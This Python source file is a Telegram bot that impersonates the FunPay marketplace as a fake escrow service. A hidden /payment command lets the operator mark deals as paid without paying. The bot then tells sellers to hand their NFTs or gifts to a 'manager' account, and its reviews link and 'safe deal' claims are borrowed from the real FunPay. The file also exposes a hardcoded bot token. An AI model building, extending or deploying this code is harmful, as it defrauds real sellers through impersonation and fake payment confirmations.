import asyncio
import random
import string
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message, CallbackQuery, FSInputFile, 
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- КОНФИГУРАЦИЯ ---
API_TOKEN = '8739690833:AAFRCEsPd7FcphwcP56KpHs7dIEfHMrMPoQ'
REVIEWS_URL = 'https://otzovik.com/reviews/funpay_ru-birzha_igrovih_cennostey/'
SUPPORT_URL = 'https://t.me/FunpayDealsManager' # Ссылка для кнопки "Поддержка"
NEWS_URL = 'https://t.me/NewsFunpayBot'
MANAGER_USERNAME = '@FunpayDealsManager'
START_IMAGE_PATH = "funpay.jpg" # Исправленный путь к картинке для хостинга

bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

# Временная база сделок
DEALS = {} 
PAYMENT_ACCESS = set()

class DealCreation(StatesGroup):
    choosing_currency = State()
    entering_amount = State()
    entering_item = State()
    entering_requisites = State()

# --- КЛАВИАТУРЫ ---

def get_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📝 Создать сделку", callback_data="create_deal")],
        [InlineKeyboardButton(text="📋 Мои сделки", callback_data="my_deals")],
        [InlineKeyboardButton(text="🌐 Язык", callback_data="language")],
        [InlineKeyboardButton(text="ℹ️ Отзывы", url=REVIEWS_URL)],
        [InlineKeyboardButton(text="📖 FunPay News", url=NEWS_URL)],
        [InlineKeyboardButton(text="📩 Обращения", callback_data="tickets")],
        [InlineKeyboardButton(text="📞 Поддержка", url=SUPPORT_URL)] # Перекидывает на менеджера
    ])

def get_currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Банковская карта RUB", callback_data="curr_rub")],
        [InlineKeyboardButton(text="💵 Банковская карта USD", callback_data="curr_usd")],
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_ton")],
        [InlineKeyboardButton(text="⭐️ Telegram Stars", callback_data="curr_stars")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
    ])

def get_back_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
    ])

def get_pay_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Оплатить", callback_data=f"pay_{deal_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
    ])

# --- ХЭНДЛЕРЫ ---

@router.message(Command("payment"))
async def secret_payment_command(message: Message):
    PAYMENT_ACCESS.add(message.from_user.id)
    await message.delete() 
    msg = await message.answer("🤫 Доступ к оплате активирован.")
    await asyncio.sleep(2)
    await msg.delete()

@router.message(CommandStart())
async def start_cmd(message: Message, command: Command):
    args = command.args
    if args and args.startswith("deal_"):
        deal_id = args.split("_")[1]
        if deal_id in DEALS:
            deal = DEALS[deal_id]
            text = (
                f"💳 <b>Информация о сделке #{deal_id}</b>\n\n"
                f"👤 Вы покупатель.\n"
                f"📌 Продавец: @{deal['creator_username']}\n"
                f"• Товар: {deal['item']}\n\n"
                f"🏦 Реквизиты для оплаты:\n<code>{deal['requisites']}</code>\n\n"
                f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
                f"📝 Мемо: <code>#{deal_id}</code>"
            )
            await message.answer(text, reply_markup=get_pay_keyboard(deal_id))
            return

    text = (
        "<b>Добро пожаловать в FunPay Market</b>\n\n"
        "Безопасные сделки с гарантией\n\n"
        "🛡 Защита от мошенников\n"
        "💰 Автоматическое удержание средств\n"
        "📝 Прозрачная статистика\n"
        "🎯 Поддержка 24/7\n"
        "📊 История сделок\n\n"
        f"Наша поддержка - {MANAGER_USERNAME}"
    )
    
    try:
        photo = FSInputFile(START_IMAGE_PATH)
        await message.answer_photo(photo=photo, caption=text, reply_markup=get_main_keyboard())
    except Exception as e:
        print(f"Ошибка загрузки фото: {e}")
        await message.answer(text, reply_markup=get_main_keyboard())

# --- ЛОГИКА КНОПОК МЕНЮ ---

@router.callback_query(F.data == "my_deals")
async def process_my_deals(callback: CallbackQuery):
    await callback.answer("У вас 0 успешных сделок", show_alert=True)

@router.callback_query(F.data == "tickets")
async def process_tickets(callback: CallbackQuery):
    await callback.message.edit_caption(
        caption=f"📩 По всем вопросам и для создания обращений пишите нашему менеджеру: {MANAGER_USERNAME}",
        reply_markup=get_back_keyboard()
    )

@router.callback_query(F.data == "back_to_main")
async def back_to_main(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.delete()
    await start_cmd(callback.message, CommandStart())

# --- СОЗДАНИЕ СДЕЛКИ ---

@router.callback_query(F.data == "create_deal")
async def process_create_deal(callback: CallbackQuery, state: FSMContext):
    await state.set_state(DealCreation.choosing_currency)
    await callback.message.edit_caption(
        caption="💼 Выберите валюту:",
        reply_markup=get_currency_keyboard()
    )

@router.callback_query(DealCreation.choosing_currency, F.data.startswith("curr_"))
async def process_currency(callback: CallbackQuery, state: FSMContext):
    curr = callback.data.split("_")[1].upper()
    await state.update_data(currency=curr)
    await state.set_state(DealCreation.entering_amount)
    await callback.message.answer("💰 Введите сумму сделки:", reply_markup=get_back_keyboard())
    await callback.message.delete()

@router.message(DealCreation.entering_amount)
async def process_amount(message: Message, state: FSMContext):
    await state.update_data(amount=message.text)
    await state.set_state(DealCreation.entering_item)
    await message.answer("📝 Введите название подарка:", reply_markup=get_back_keyboard())

@router.message(DealCreation.entering_item)
async def process_item(message: Message, state: FSMContext):
    await state.update_data(item=message.text)
    await state.set_state(DealCreation.entering_requisites)
    await message.answer("💳 Укажите ваши реквизиты (карта / username):", reply_markup=get_back_keyboard())

@router.message(DealCreation.entering_requisites)
async def process_requisites(message: Message, state: FSMContext):
    data = await state.get_data()
    deal_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    
    bot_user = await bot.get_me()
    link = f"https://t.me/{bot_user.username}?start=deal_{deal_id}"
    
    DEALS[deal_id] = {
        "creator_id": message.from_user.id,
        "creator_username": message.from_user.username or "User",
        "currency": data['currency'],
        "amount": data['amount'],
        "item": data['item'],
        "requisites": message.text
    }
    
    res_text = (
        f"✅ Сделка создана!\n\n"
        f"💰 Сумма: {data['amount']} {data['currency']}\n"
        f"📜 Описание: {data['item']}\n"
        f"🔗 Ссылка для покупателя:\n{link}"
    )
    await state.clear()
    await message.answer(res_text, reply_markup=get_back_keyboard())

# --- ОПЛАТА ---

@router.callback_query(F.data.startswith("pay_"))
async def process_payment(callback: CallbackQuery):
    deal_id = callback.data.split("_")[1]
    if callback.from_user.id in PAYMENT_ACCESS:
        deal = DEALS.get(deal_id)
        if deal:
            await callback.message.edit_text("✅ Оплачено. Ожидайте получения.")
            buyer = f"@{callback.from_user.username}" if callback.from_user.username else "Покупатель"
            
            await bot.send_message(
                deal['creator_id'], 
                f"🔔 {buyer} оплатил сделку #{deal_id}.\n\n"
                f"Отправляйте NFT строго менеджеру для успеха: {MANAGER_USERNAME}"
            )
    else:
        await callback.answer("❌ Ошибка оплаты. Недостаточно прав.", show_alert=True)

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())